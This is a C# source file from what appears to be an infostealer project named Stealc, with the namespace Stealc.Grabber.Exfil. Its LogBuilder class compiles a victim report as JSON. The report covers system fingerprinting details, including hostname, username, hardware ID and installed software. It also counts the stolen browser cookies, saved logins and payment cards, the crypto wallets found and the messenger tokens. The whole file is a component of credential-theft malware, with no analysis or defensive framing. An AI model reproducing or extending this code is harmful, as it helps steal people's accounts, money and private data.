using System.Text.Json;
using Stealc.Grabber.Grabbers;

namespace Stealc.Grabber.Exfil;

public sealed class LogBuilder
{
    private readonly SystemInfo _system;
    private readonly List<BrowserProfile> _browsers;
    private readonly List<WalletTarget> _wallets;
    private readonly List<MessengerProfile> _messengers;

    public LogBuilder(
        SystemInfo system,
        List<BrowserProfile> browsers,
        List<WalletTarget> wallets,
        List<MessengerProfile> messengers)
    {
        _system = system;
        _browsers = browsers;
        _wallets = wallets;
        _messengers = messengers;
    }

    public string BuildJson()
    {
        var log = new
        {
            system = new
            {
                _system.Hostname,
                _system.Username,
                _system.OsVersion,
                _system.Locale,
                _system.Timezone,
                _system.Hwid,
                _system.ScreenResolution,
                collectedAt = _system.CollectedAt.ToString("o"),
                software = _system.InstalledSoftware(),
            },
            browsers = _browsers.Select(b => new
            {
                b.BrowserName, b.Engine, b.Found,
                cookies = b.Cookies.Count,
                logins = b.Logins.Count,
                cards = b.Cards.Count
            }),
            wallets = _wallets.Select(w => new { w.Name, w.Kind, w.Found }),
            messengers = _messengers.Select(m => new { m.AppName, m.Found, m.TokenType })
        };

        return JsonSerializer.Serialize(log, new JsonSerializerOptions
        {
            WriteIndented = true,
            PropertyNamingPolicy = JsonNamingPolicy.CamelCase
        });
    }

    public int TotalFindings =>
        _browsers.Count(b => b.Found) + _wallets.Count(w => w.Found) + _messengers.Count(m => m.Found);
}
